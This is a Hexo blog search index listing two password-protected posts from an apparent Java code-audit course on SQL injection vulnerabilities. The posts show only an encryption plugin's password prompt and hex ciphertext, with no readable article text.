<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>JAVA代码审计-SQL注入漏洞(二)</title>
    <link href="/2024/01/08/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(%E4%BA%8C)/"/>
    <url>/2024/01/08/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(%E4%BA%8C)/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="591afbc45a6902c5ad7741f27d99bf16ae40496c6b70f1b437c441e1ae39224c"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>代码审计课程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA代码审计-SQL注入漏洞(一)</title>
    <link href="/2024/01/06/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(%E4%B8%80)/"/>
    <url>/2024/01/06/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(%E4%B8%80)/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="7a87cb7c8dbbce1c0abdd89eaefe3c18969d7ef4def1cb4d56059ed915fb41dd">ae0019fc965a82e671e40c2a2d1dc1b5a24390ab55b97bbf9f4689feb9f663c4ba7774a690ae029198b5304363fe11d12b9bf2484a6ce9608a5ba7ae3d1d18f1bbe98db12cee07c2c938582bace41d7417687538dbc6377ba87ca1e87e830569c5fbbe9ac8bd54ce97a28be74e556a2225682f1eab0ab9342e10268a7b30cfc47180fb29dc3ab9c734696993deabe0e23213cd2ae3ddced4419827d18e2563ee4d67112b0084bab9ed0ad25acac9066e678f11ad72c563945ec13b60894dff8599bb9be5870002d48d9d2193b4a50adffdf55974176b585873cdc19bbe4ae105e1cfec3113afb9cf1a82db7bb1e112b4022205291f6935b74fc1f49d9f653c08784d07f6b0bf59e11f208eb9e50d7a08dc9005e19e4ea75fc67ba1baeaeeea4374581570e9c22b82170d6ba96fa9fb75aa35a1ff38ead3bbe78007639270cc417b55f4d4a5fbf8d66c1eb74399325701a0a622f7d1cd4e7d744ca0bc6140572171c9b5c065567eeb2e60632122113f70ecd191b00dc27195489f009036f20cd9aab92467f8976ffba72864c337c2fcac2126bc003a59d70ebd8db8c9a8a4577b9ca15548462e45183081af69afbf3f48b5f66b49509edf78725228d838f81692e9f4a2da1573a85e4cdc57f89bd74a7fbc37314b9965915719e82daac5c839767bea0ac4ecc341b5594c95d3a95b56ecc27b6806b0ba8ddeace203ed1a9f7e590edf348703d844982a236eab7c0b16da6f2f3d443072fe82bd79faa04b50ea249e4a53e69a3300d8299a7a8fec277a9347764e1e393169849a4351b0ddb146945077306413bed83cba9cae19225186f306e11b7db401b72d8aab8a4f6bf148e4818f960f0d6da7d0432a5e7c450d4a82b1a233a3dd6ff72aa26bf5b7cedbc5c7b2722d5a3a7f6d57e6eda2dc65e315351a1db34a5c72efffa5e12838b63a45bfabe0228fd2d1aea0a1d219d59ef32f98eca55ec6fb1bf1d7d63cf0b388a79a0e1527e7e91c999e52ee1490d616b23daf4c20f1f08004950a53cce9b2d445f2bf6368071ddc73258715f5e7663912e7cc3e052efc717a19893dda284c728349579310658d8ef5e33be67e95751929900b869276fbdb7f24e804a9539a77f6176015930bcaee24d59ac0592d39f01fcbba8c7007ea98a2aa12071281c8470138c014f749ee7ce86b6e3d100f4ccdc84ee25c387e6b34119e9e201acbe7a36d80a8461726ea5bb97f0093653a776c036e967422cd8f0c52af692e7189f4652a917c36527771ebcfb4380c952e252f198d56b2ee8578c7b4707eeb7a22b1492c14b74bd1baaba68e40472266ad557755d0ad464533c96b1340476cff3df13a45eddef1a79dc3530500cc57fc6ee6d861ec36f674a62bdcba0b93ce2243fff16628dc87435bb2a5524f5e89c3c1f1017422c18d25ba1b5df275350c7411cc93d3973f240f995d16e6c0cb4fa6bd58896f8e6ffe98a1ff7fd04ccdaec1eb7b47708a20694f80c37886ae5c2d9e449f6dc661858541d92b9180ac9c48824e74084aa6e175155a6d0ac44429d039f74d1e39ccac4e5f1248095dcca8519823f0fa4fb34c90062b4284d843ab2cebca3ea7d44a7e25b5b33207cc4780d8d421727c2816313cc0c58922c688ec220ad81341cff4f51035a07c54c5fea4e698cfcdd550ddd4e6cae814eeea8b3ec527832890705e1d351f30a000896d207a4fd131c41aea379922ad13b883f11761c6401c590ae22dd38f2a440717f3388f5b115fa082a13efb4e0d3d70b32bc23c42c56ea3e19eb49e5bcc104e4c6a0cfb4f1d8bc02183ad6a4a665db2a8dd63b00328090d3d4800139233996714ed49b7cbb07beddd716b27f464108dd28e14a54222dc7ca205be438be4e395aa88ed8511ba10e253ea3ef48258191ea98ea8634ed3880dc62b016e078f162601110d07d9baa6dd782e0013bfd4f1ead6fac1b545e4ccd5476def548997ca1a53b8305e8d2924e8c176a8238d6b760e64b2b40e80122cd223f4a91bf223efb0beba9bfef73d0cf1e4fe4fe36b4373ec748cc335d0cbbf78a24cf71773237dc3d27747d95ede3153c93587c4817490bab9ea34da6cf4c9bfeca81c699415c854b70488964c92fe9a5e48e2596931aaf128cb66ae63066e27c22f0b2e719552149630dbd4a42122df8ee415c9e53db6d0762669d3f2ec41f427dc308470d61b2b31cb8e8d00dd879004f1c324b2098ad687802887b6d7ec0c0b49ef27bc4c479536e15e67eb3342d42e2314e6da5cd49d949a35f07518a419894b8b3c20a37d9fd521afb9875360c9261dfc7cccc90f314d1c1f3a96c41c22a32442e6b31252ce8fd450ed30cbfe9135d16fb6b12031ee7797862850cb35e104aafada36303dc987404260f9bbe540392612a505d7be8dd77b2c6281f118fb492e37c594244f4406e1f23261b8946349b62f6cb805e5da35c4d3178e191d105e3e3389617528edf697f96835ac8a9cc9db6291936d0a0419e4d64ab924f144d2ffacdeaa313d3da13b5d8f40af8b71725c80f5643695d018b294ea3bfcfe09dfae65ca2c6ebf1ad749300d20c99d328ebea1e7d07082f4b24bb83665511f6ecc000622dbaad254ddacccf4aa41fc951864544d1eb9ae758b00f5b2b356c656831a765a65d5f3451ea4875a2c3df56948e7299164676a411266abd44c263bba99d759a33a4c159efe2cd9cf4303eea87db186983f49e6f5cc792c788717534b6efd6bed153501a4ebcf9f080ecd13ba16c237dff59d422b8c5aab78588cb8f9256c1e3ef57dfccae86b98c482740f57d2520edac82fc8a26c3953f43e27577a860e13db21bd393bae68e0c79c4f8cd5046cc73fd50809c9b49d8f29471a9f166b3223f66d9fdbbc32a3ae54c459d60c9f1b234abd21c0c050683c22479a9bcd52655d3fc78f37f70655572b5729a55242132eb275ab388d408fd1686e53727ca5dae6d79593c543b139a87e2f7ba11e00ac79379f8ece5fdf00e4e76043d21f827c8cc53b95a5a8f55eabad8a2575a06c7402657001aa382cf48a14d02c6442fa67088f92b34871cf6188aa858bee99ed70edecf39098ac62f0e4d1e1ea241baf666e16d1eef7184411b4be48961579d30d5a45683329dc24f70d69ec5cf36a68c21b7efd623236965aaad665c464449018343914182f469cb638cf8807d47463a0b1d1be79674fd42e6b2f6b4547f44d6a547a24a235ae3fac172dcc0b83d40ea86a124b0cf262494b83875733904632cea701bb374a54ff1bc6ed52e948ebe3c5ac2f4b0e8fe4f746b52c23f21e0fab170b6931fc5fb71ca002541e4e4c4f286045612f03ad03682c831aa35e00d55d163da9ea1b796d3e9484a630e442c3fd9025fb31ffca918a3eb12ea0df3aa519257371899b3439be86d4639a8244c755d3939931c9f88063c4f3083f497d9676fa1c084e9ac9a61b5dbbe5d032b2833995c6e3018665fb601000fd83d2c1ced067e718643e8017d74e5ac0fec6ba6abae73b17e0ef0adf8bbb57985e197d2d19398ae5cc66195d54f615564968afddfad4e5f3b0a6638caae7ed97cafbb8190d4f9261ec523e3ed9135e895a51f2bf4d2326fe5518e325a3e659ae9226d380c69826b64fde8a1d034ed865d4af10de52952ac0f068e4595b255e1aaffbec365de9a51f0e3a82f44167d8b209127d8b5dbab790ce97052713e9603b302f021e7f9b71d2f389a89c7a7abc506702757a122019d3ba2ba3da4728fb32bccdb4bfb43cd52faacb31657c65c2892ecb47278e17b5f97180044d01c029c3d49f7273ee974f11277f1a28af295c44da704d03ae9ffd05c77ba78c252ca97491c24d2b49cc8015e5ac0994f8a334afb4d914b79c784e0156625e2299de9027483d2daa0f5aa107f94989b21269ac64000c81fd2a979a822cbaf3da4e5b7eb1d587e248354ff70211b950671098df2ae9de7298505691e3ff187c58068e1a9f03b10eca2a984354327355df9288d22440f3389f3121dc793ac71f74eddf754e118dcd159b6e226d699e0c495d95b075f0e2d1bddca3f9202e39f4b6e987f821a413c56e96a79e29f7bf89162f41f8334f8f81edcb893665e3f42fd1ca70e1c4438131c20054bfdd735041200532c68d87a70ee28bc72ee109941fc4f24d2297466b5467443d91f33872f0fa2c35a0824c943bf029f7ed75f0bbb4ad7fbe1a2af9216f9e293cc3b5eac6fa857171bd54558975498f6c2b0872194af61f6e4697e5fc4e305c1a2a16a927a939322230cad8a83df0d3ce6b259fe3085263dc22364b70ab742506f75202398acb6a6896af4d56b4c9aaf68b8c82cb3455b188993d99bc58d6eb0f801d09bec70cd186598cf9692b158342a8ca0b7a162e20f63c52fbc1cc1404bc17bd84c327a63a2265044ce44cafcef0b185a1ac91252ae2732b3008448ec7dec5c3ed5a9f8c987815c655ea83699c65478dbed59b58bd1bcebafeaad13d8f8ef8bfdbe4c1f6c4a0fdd1a9225b60dc8d80f3d0ae797df60b28ed115daa028f900e405a1a363a28520c698bced1a3f3505875040c50162183356b92b5717b80133003330daa5784574dea22b55a621a492e7aa537c36e96d2afccd95a96494b65132c5523f6bc70e43a66f0b526c242992ddbcee0b1b25f892b673ff2b9b41dba3b9a4c02013462e758b52408f7d8c5b21197fb87a0952ab46e0ee2c7ee0cab71263288dacb47915cd40e2c9ee0a57a14375182427f778cc7aba36a1d49078980020330606e7068f67a50ba2e83a6721f8b5ef621a50c47195a6e469e482910ec08aed7b5cf21337d730b5034bdb5688f2e51285afbe9e15a0ca8d096f83987d08871377cd0277d8b4cd2d618ffef3f2dbb4c3ce06d6299d28af7a4b72970f355e50d307fd619bb2d716fdc1b2770361f0ce5ab2c2915dbb1e4ad9118b1353ba03a84e6b590c244ccb293c5c82223caf26260f24f3d54c444cd3ab7b3e426d162343d6b3657ca3876fc038564f2e416b615b8e3c4981df5faea4a7ea1258d1ba8d21910417949c8dbb2318ab49fed515dc009ef8523aadd174c4d56a25fadefd889b7ac953df9e910c39299b826c8b9bb51dcd604e7ac2bcbdd664465f022f0e88c17bf3bfe6192b8ad998c8ba1f81a07a937705f29be66aaa3279b7f8168a6a13f4d19774fb6a4d9929d1d49bcbdd5f2e64e9d7df115e7c7c9c8736dfef6a395c765431a9a7e5f662f11e062551c10d1f640ee46b8d1f3f5a14874c723b17f37653ff3bc89a90411b1f2470b16ccd208e8e6f9fe05e39ed14e9c244b1f6cc2681e3b6da0bad0b79723848d136e23c4369ab52f413f2184da6cf62a70ab7027f7b49839291895e4f981276a3b2607326f55a4e5c035d084bcb39402547229732c396374bc3f2920405f215272d6a4332352c9a1b6818ce11a96d1d2350165701fd7ef25f39a520b047a8bf9f51d30c81ca9149628f0fbb049c271bcba9ba31fda83e192d5585a08c2e3e11e7a40cb13bd3b5e7ba745875a3db5f937654287176c7716f658797187bb7668120ccd14a337324f715be486a81e2c9c3ad7cae8eef94d51d18fc2b8e89e103c0283adf384093c596a0b4896a14f178e969f8bb40d4bbe71ca0cd470adfd4cb0c158daa75be327c0e8cde234c02d32ca2d41380001d816823302396a19594324c2d98db0cfce2bad2e10292b971c060e0a2d6c7b4dfbf70ba48565bbe22a5de7de2e3639c7ef1721c820748f719520afabaa4db44d2e2308d3365927d817afd73a26fcdba0eba293dc9a98ba9a0772bd304542e2f0645b029456eb1ba70c2aa3642ee25a2ff604cfc1553cbbc29f7389e6799dc222c1f57e366dc7fa0e0c96bdf81dfbc12807ef34e653c5e4523d1eac3482c5368e24336a7991e1851836b7a416e413cb6dc8780b3e93dea4db50439bb59ee955055e243f75c37b06c6f703f648909fef7e194073f31eae89efb75fa9f9258bac221f74a08e396a07c499e22cf17b824a4465e918fc5e79551c1d78b5cb366b50796dca0668a09a621eebc1b80734e6dfea04af1353231e4da9e0a2efb06c1398245e4f51fd091973cf5486ef5765a760cf4cff5aba94bf4aa04a817b73c2871dec2629be2ba0bb0656623319e2414140f2d62e58e0b38f630a6c90e4ca3cf91c0e09352c2de54121247333259a5403b27a35dea5a5c50b14a7f53a6a9356a9ad286c272fcfd9f608cfbe81685388e292ce301b2ce02b681651a58f2db156bf1195f8ea0c587420017981880e2d391b4f3a4f14dbf388a8cd5cfb2b2082c9642a044f54a628993e5aff39fc01e93cfd6274fc01d04fb0911badff21525c6cd82422e618318f795501ea79b91bfece43c2769fba17295bf4b1d6f7bff7781234510474adfba8a2e7e68305696aa9ce1fa8df35b93a7e0963d40a1b15960158a4c28cdcf214c77289943944a67e7152658f14b85f8a43c50bf4e3009ace7a55b60e99ccc5521975b913d43e602704a29ad8c76baf5194612918578423c51b154bfa849711708896c56d796e684f5880239dcfb37429c8c2d7d23855c1af05f6f9d072405ecb8d007c1e067f6009593fd8dd7d045176123ca15f71f57e66abaf1841de660a0609b1f111f7747ff64021a1e2e64086584b44bec9c1bea72204a5ce79081c395508d5e740890d721bb39b909f8d58bd35ee8a5b5fc7af3fa7c6b15b8d42aca870ce492951efc432cfcea67a60883b0bb0bf167f389573bdcdd5cd09c6b27241d87e3294cc3b00fea4e0f7e2c353cf6329440c0c0b83805dcc70f37ba90bfe1546388b3c0f745e6e63b845ffaf43cca46466951f21701c24deb411592d027a3d61a5ba950b98650a5adda851acf80981295116da78c28ae949c9fb5077ad38f2e21578dd7692ec83f48c0a9a523d212ce96b4e980132fd83462e4a5085370366d8316d087682f814b087d091ad0a039cc2c67b7529a4f8c32634a318848aef18732c7442689de8e6008e31faa877d14cb4fface19762e24588332478668fb5fecd3478402eb4ff9c04359430e418c1096f89761a92cbeaa57e21805f091f8d24ecc2459f37f8e8066a22b5e7ea6f2fa631b99d7f92012bda6063915d906fcdabe34af3f7713393e22c69f4b5dd2c7151db0d693fe2a6be53c594743adcad44e346e0ed8cdd5c9b4e8963d3892bc19cf37ef9c24f50eb8c2110378688f09ea4cd4c1ea93620c7499a6ad92185414bd9e015870bc92ee008d7a067fd784dd6ce95b92fc4b1a16648983a6f992dfdf4553644776e48ce11f436fe506eb730744fc4afb95a1e9ac920001e722aa3101a32a082ce7fb7151f842999b7f148c7ad2f03b7ebbb01f28fa28ae6d1fa14d9f91b5990b25915311c1b9ec271a3e3490ffc1da3dc5fd0609f46298baeb8cd6960396a52a8414bcad05d6f453499ad568a28ca282baedcd710e120b4aff3088d7a3b58246500fedb555f2312b91d97daf18ba3130ba887ae61d37ae9199a56505fb16f7b4ec4bd8799823ec7c6ccfc518e83e539e27dcb088f139948af17b4ba1a9656106d943affb5940bda035dbd808b5497bb744c7d624f2da96f3f455d346741a06cd3bd996fd95fe0980d8f4fd859d7bd44a96067b3542f705bccfc2e9f0e0a533e3aae53215c9500e1c05ffb13b7327651fcc727f74a8f5d6c620ebbc760a17f7e9f0bc365992995a260e6118b3c9fb4a699108d3d59c26cec3e7fa8f30108469002a36282fc1cd6425aaa38fe37ca6e60bc4cfa912609443aa42a49ea3c0fad83ac4e24d71293537e1d60424dfd08485f33156ffcfb915878be2562fc248e11f87466eee9074013a42942ed1ac02f8e8b296119bacd5961aa7690b1b5e4b600e775545e00240ddddad43b0338dbdb5b62eac04340ba5299e3f2594e447671a9cfeb5370e1135daa1751f680e8852c2799edff9ce08e55d5a45ca097ccac4a4857e1024b17605c74b054c59b12ceb1ccabf1d8acc53a4fc015006b50deb0e499bdaf280f67074cded5be73fd2f13d57610afc3871fc11b6092180206e0fb0d2cd872d4b6c6c54286bd391def013c206154b18c2207a947ff0f55d04f323176e63c8514cba509c2914a6d93da7a5946bf83c87c320b5a39f9b9fc74a95a552fc9b7c0ecb12fdb95650ac8282cf798e5453c8d74c3970f13f3ca2e7ca78fdb5ff5786e4ad6aae7ce76cc2998f217804f6282190142a4c72e69cdbca5975fd714c8d002577da1f246d86046c7acc12aedd2fb91358041ef196ff2d7c2928507060627d74370e5399f0a1238fb972cacc58172559486ffcd7f997fcda98f807cc8629b3d10aaf58e1666a7c8497fb42f766e9c6e8dda5c586e4d6e2237986fa2c426accc4aa26b9970a31b3454448a668bb509cda93f4bf0a425496f712f023ea4b43759777afd227300429a570b2f99c14f152be0b0cefa08e6cb8d8a9b29c6adf05d1ce2d1e88cc923da102161115d0cca475a62a0092fa8d7843e12c42da8a3fe479df22e1044348c31385bdb567c2682579b797e4bbbe68bc44a518664b18ddebf0f366530bb30f6b2a1515d3af0434a18db08c3d28d080d48b8fb2408785869bbaee261de5173c419b7c967742c0461d00b2b834f2f857c1318fde476fc4f3bf1edba4e2469590ab81c5e0289f605d41cc708271f7f83951bacbc869ddcb25489b6aba9994b4a22f5b4e78e0f15ba68e155a1dcd5a21427f562dde603ee8f776fb3f082ff436856a48d95eb254ec993bc2e207d67ea6998379d9657e4aa40ea6fe37074aaccf00b52a0aac042592295cc73fcf7695807c42f3e94040a1556e6c602d02c1c79e5c8aef44d87daad635b277babaec45a88a854aaa12f8acefc5245b08c8978c02e942e2c9bb6301048a1a6fc1cfa8cfc4dd50650d0ace3f08dd6b59e848636e69fcfc4f8cb530b93ee287d6e0f42fdad17525e616f4e0b01dde3d28303b0a60511ebf8b9323693e873db0ec996e0d2b0984bf33892901db43123f744abb0b9bee74e39f7264fb157fb9e35d57a0188b092722136887e4d62b9d3c6491998e8f5403936359241b9a5ef44775d4b1620937c3c6390afc1c05db5b6c1ee628c5ac648c92baec2ee53c073275ec13d90e63467b7c717c7955c76c2a319990812f58704086a0d0d0389c6f8bbf5ef64c5df17665f7bca961433370b2d8e9d9a2569b650599cc68fe1497e67fcbb10ec386bb094de7fcfdb6998072c40b5df5b3e45a814471c7423e2fa549d352860dd5d5b13883a63f3125cce2d2635ff1272ac5389ba5b4ed2d9ab86a679ea4b3b4cb327b599fc9c630f070076635385a2cf3fe01b883d1fe01d3b62075301130057af414bf37a518b2dc359197bc3871aa0f1a705c4728cdbe78fed4f354e206be48329fd4883bfa9b121023885215dad8e816133670dd1ee3ea0ff17413b423487605e95f75bedf9c08620556521848511dcd1ebe6f6adae0aeb1bba14a7effccfdc2e69bbcec71f65c4b81900ef9bc2334b07aa17f3f407a49b970b50b123f500a9fdab4ee82824e3fb5360c80977daad11079da1079b612eb46408c091c1d346ee70afd97f5ca1b0d8da09cbdbf16313f8b8c062ee3956680d37ab123a5ad49ff24391696ab12bd32abb01acc001f12230cb52b8aec79e7d944fba595d7ab40e713f7757443d84ef6f18c02e0d97b47cf60ca15105361e963c5b8c8a6d333ca2c0afd1d1021b5f02503893e19d8b5069e4e544a0737d93d6752fbb6c8d4dc42c796443274531a9d104e4bbfdf1b2d94976e37f5a627d54974288475e19fdbc97f3a76361741711fb9677b2ca66d22301ddd232f458c749daadc3030e45d95be0a8ed1749cbd3afeabdd89663dc031289ca8899efb0fbae67bc76c67fa50180959d52bd15ad77db2943c970438beb368a1a935d935e6f56c8fd060b7a27ec8f3cfb7ffafd239c16f97f557da45d4703d40d4ef552f1539a13d5df3cb4dc0aef78428a58ef80d4d67d3e4f5545c5fafa35e2bfec1e3c4ca0c6137d8052c13e0e88a535c282ac472b35b93cb97bb67846bc638175ba894d1cabbf9ae5f3a2b8ff23669b5eabb1e8859462020dd6e172c8e94b1368faeb9307a9f9a19898ae283eb2c28d3d29c3f2c43e479eadb9226698a7bbb2ca94f7cae3e21b941d61832461f671498b0323b979e1cd0674b2a38b40553cd087168ec04315dab443d70d96f7d6d43939050e213523692a04746967abd8e6f2a2e911a5b0a9fda1e71b8d76f77f8d491072f46b09b7999dbfb522e0e0216126ff3c31e52000871e9308ca59e70b7fdba1af2ec27b1e2b272f5ad960f89ecbfb778f7a807591d25ae6284a40c92916520465b7e11ffe65dc74dc9948a665b96fbadcafed90b2bfc67bd7ba89d8484e9cdb6ccded81bc0e5e81b20148303852b88f7db5f2f23f108242829cf9edd9ffe303db2fe1d37326b431be5562d737f09f04aa358f3b5ccd8dde117a20ce77452d2da92c2089e1bbdee98d12a0326fad32a96bcb2c7415ecc4f8b14a6a674c7ad81ab900bb3a3738e2baa983dd6bb9b3d11f42b205f30696edb40f86f4ccd70ac2acbdcd1df8ca44869e7e016dc01c1d176d832c4d67ce3098564424b9efb9e3cb23530eb8bd0f0a5324d98ced2220e6a7a0d5b9d04dba09380e1817d63f1cec510a5b6fb35edf7d32e9178a16a63d26cdc5cfefb345fe02af15cee5d1e567f17069f71aa9f1c6c4f582e7cbd8d863571018fc0a16e801ea38128588502dd9f78fef8e5207cf9112bfbb5e672b4c87eff556842e4d1a0cc455a36c649b2427bdec8d0c47b9565d183e62765129630a9df5844ac74a42bba83c3fc1fefe97cc8fac92cad65d0374e6127ed9ca365e7a040f8de8f92b027f099009b4025ef7100586bfa3e4f2eefd1f654f04cb408a8fdf6a57ce712f5127cb8492af10718e28d44c58a92c14a80c3deaff435de01c3f359c75655d3a0fc5011a764ab7280977fd00b0e63ca8f6926846baad29872df9e6bf9b4a6d7344c1ae6c7cfdf17004a44d7c5e70448e3c2ab57fe2a03823368ddcc527560e5931de94e5ec94055d2e5b3b2bcbd0cdd171955d1a471bcac6ba8248d81461303fea2fb6b6c8c2b928f72485ac0803c15b92d6377a932eea3cf8a9369a370540ad743e99236606445730b28b230d4fee29f65ce3636dfdd1b3db4f7c14da6a164c2ce22d222532709e0a718e8d67806a637d608d22622a158ae5be8f76b7fbc28d172c2e37a2211799968d75ae3277843d4936c01ed4407acf6ee6296cb4558a1e0b494597892bd089a178caebe0d6b5ebe6043a56802c7bc31fa86d899f5ef3471fc4b006ec6004a166f21e0ce2ae5248ca679bfe3a07edcb62cb7f9179a4165d662d67825f69c0af3e368b0e1795b3b6159a790bee10e18c4fdfc9f36f8b87ae6d7164ac6311b302a0d6317219b32d207b36f7e6711aa5b23ac13f62cbd1046d28eb0bfd916c75e994b98b35c1b8616837861d18cc1ab16f8a57564748e321dd76d0d73923c13eae7d7e4b4c76a0961b4c4c0aac7a1657c83e51ef894dc1fa787b5a31d9d5a537004f96f614332cc8e12c306a535d6bfb476de9f9b9aeea8fc0757ffd44c3da871af4f27f60a0c859f29b15928c503474bed3485fee37cb2385301aabc0cb755f07fcac60a0f33d0c76a138e7886b7401b4cd81f246c6c9175c0fd311ae7f857c8c714f73e7818a4a6ca8f334fab373fecd3c4d3a1dbad1aef84725a5971198713871891217d322d4144ed1b4f475e8215e8abea1a10f53ee14d62ecfbb91f681b7d595303decfd744c2f7f3d54c8ba1ea8a493eee2e88deca09d6eca3bb2553b3f31219644ee2a919706bccd37ad17e61b2801a0a075850d6a29432517f8bc51d7cfd5cf8861e9a041c2215fc170a232d5111492f422e002437aa98fc79c32612c20eb22299e4c4c057ca4386ee920ef74557eb8e7b2dad327f515368b153adc89628d589d2775a8cd5e2844da82843838c23cd17598791960495ddd007ac6918dd1489b6dab8886fdff170b6cf32983cafa616242f04fd885a1234da35b8ccf48dd34f8dad2cba0540e2ef302293d223b6aea639c72017098098831beb0a017d43ace15daaf4185ea4ae902e903d5d2ebf35c3d93d87990e16702e01d53d2f7577eab77c008bde92d238e710d7d2cb1b434f0681969094e4b66496005478b313a5ef3c99622e1fbe3c4f00fbcc451c0ec0f823e220020e692c6472238bd0653736399a38fb48d5ae35416353288813b04156c763e72bcc24b7490289e7988c12d8a5a9290e4c44691a5e30e37ee004a5348cd32678abda297ac4a21488c34bb51f117cb44853e7b5a765b385712b0b1b35448fb1d449613961ccbcfa4c411967faa5d33cedee6e7edfedf7a8907d7638021ce5ca11445b950096acd554905187222cccd5788003575ae0a5d21d636bab3a6e04b2e548acee1f0decf498bf1edee6b517a05b3f2f27d48fed5115f9ddc0fd4e0b4ebb97ca885d0974ef6baf377b54e53eafb135292adb49fcd4bc407d23b375a2fd6e43752376b221fc05eef2b43c4fba68aaad35e8d9f5cbc315b5ba93f12a84fd0ed4d7bd42a676d1e48257e9045b57cbb8f6723cbdf67125d1a93203f5e73a11a43a068bfa1fdd3642cd5ae7301ff45e6ab42937ba266c5b93969599c0e480d5740e40ab4e0129fd1f0ff38807f4ac78bd1e6fd480fd856afbdbb2b0714ebba46c62b183602fb0f55beef7028d392d341a65c6e82004ae54467edd05e023973677c88ad68760547f81b44c23278ed757f5daf91caabbf4c7abfb3edbe39a20f3522cbfdb0e3e2a30910caa8d48232df714c191ed96b79658c50348def13b7677e3e1be9c2a9f78253afc1d92ba6bec44a0e4861239c2ab8b96c4184f90eadcf82149135c9bd30ab1f4adf5a30542dd55f83db3ac0fd46bd0175042496452859268c5931a1814782c299a95f1e08d95feebda32cf41a68750fa74ee49f43004c739d038be41643eaf318430ee458cb0859874dbcfe8a615d8c016ab0143344ba316159aa29ec394233028f128a16fb26b6a5a81b9167411055190f4c3ce23fd403b6d817ea645424f339fd87a11cac0fe727a57e49b587ceef47f7ea7c7584801632bf1163190bc01d3e5e1f4f5aec5dcaf76b1edd21c66d01f19db7d37038bef3ba2cd69f7af7ba24017ca252e8746f44ba524dd2f4fb9c20e79deb3b8274013ac15fe41bc5d1232d154bcfd27ed3afd26c227454843d2cb5f7dbe9b94f53614f10bf1500f327ec2be4cef6342752cd90ca3acaebb4b1f3ba8f72279e5b161601ec5b558e580751700c2d3e03c5db2aeb9c462807afb61498d77224f77cada4732f3a921114dc1709d7e6f37eca8e75b3ca1c30a9976f9671b7d09369e6cf9b79948e581d8bcc8da38e5797edc7b2b4a2089055153d700a479c717ff01979d982b0ac4ec6702bd257c57246ba7f14a31bfbbdf9ba0ffcc3a8d6ba8382aabc9a9e52bcd7b39e282bf2fe80f00d1ab4479df2055028deb3408f51edb8fbc3d2422e5fdad3a390af40e4deaf1a116d1634453e743286c7b8aab09090dc55682a7b4266c00fcc472accf5e1f4cdfb8726675f4820c5f8baeb5407e69b0f3f7270b5b0d2b3a9c9695414ccb0b5cb10d6ac9a0cef7bbe45a53696731dd8b97b5302d45247eb69785c9f05e10c3c138e7e54cb9b0af67da0a8698be10185e69cb0824c337537a8ae92f050680afc29f2bf30aaca595ef6710c93adc883ef035680ae3389638c3b8f037dc3ddd59479b8ffd0c3bcc5a2424caee3159f9deb746814ec3ad458e4413f946a94352213161af3f564a55f2a7a25e9d6a3ea944f12ddfbfbe1756af2869b0420cc3a1f309fca9951a8213a2adfaa8c692cc6324f7e4f9e9da647334a647977a2dbbba5f5a542cd9d81c9da71dd636715d481de2722c6dc8fc063a77204f46e3869e03d40d07c1a481836af0d1ae7b1375e5e528c6eb787cadc3e8cb64d39eb66ba0a0ef1c3f170a46445ca7b44abf4bcb462f8f581c266669557cd0619dafcfdee6276e3e6daaaf6651b090aebcc57fb050a89d2e034dd05270ff6dcfa55f9ce683c883a687556f7f1c9e9602f865af59a8f683f4f837ca34d5816ddaa21757b586a5de74698606e58aeca42abfd840b1f673a8501adc5101d67714f39e968a5dead1b88f5d4e17ec0573447843ffaa91b32bd1e982b7996a13bb3cca4f7281839d545c7832f79ed9162f6edf6c097d70ab00d248ee21ff30db0a49b5f11168ae45b624a57cff092d2922b09522eaa0fbed4c11dc23ed0e4e27f530d824b400424ce4ec4ec5e2019c0518a38fa60c5da4c43994c6cd38083734daab7be0d0711ccbd047b2efb2b5e226bb4bbaa1202612be19ea53a54453f78171ac44a3ad2bab99821474117943c41b79eedae6a83b674f8ef021fe378711c64bc3703d1b99cfce815229f9aff3caeb01846fd93d0da4f0ad4392dd1357fbbfaba667f856ca672b74b7882f8f23151ea3341436c44df702f6ac08d8cc8c864b46ff08fbda6629d7295476096bb5afa829e729c141ff4ca9b2689533c574a9bc723de6df46bde506af38687de502308d70f12f6a86627660276e80429fcbfdce2df1c56a869567e57bd4234eb20444b4c91b7816a6c9d3121e34dd6f9d3b9e4ff5b3ac8f8dc58412059dd5f7c81f104c9269903d611c1f8cf909bcadbb075ebe37664bf59cae1d87ed3f0c62e40b0e8fec61ad96d4ea7b64af2044833965f5a3d541c1def2bae1ab1b4e63ebb7948444610588a438c017de698468aaba8a83ff23e67dc0a3d9b8545d27d841328f7faa21306a443388f91a48580e3eb3d35e98f7c7273c167672433395e7a4081c5a01466506ae1497094b5cbf04e7b22c4cf9e681ac26009695ba1c0ca0dc1fe24b41481b6e3c38cb9bb85cbf4dd3ea192c46babd11c87a51517242aefc2033ea457ba995aa5667da9378bd0c20e665dcd5da125f41797bdfaaf3beb3bcd225afe5b6c98e4ed7aeba67cb94d3e8cafcf6cff0d35fb69eaa820b11160fe8f3f245cd74b845c2215487d0728fc56e087cb880cbde967bb6e4df8034d642b4db53401112fb61b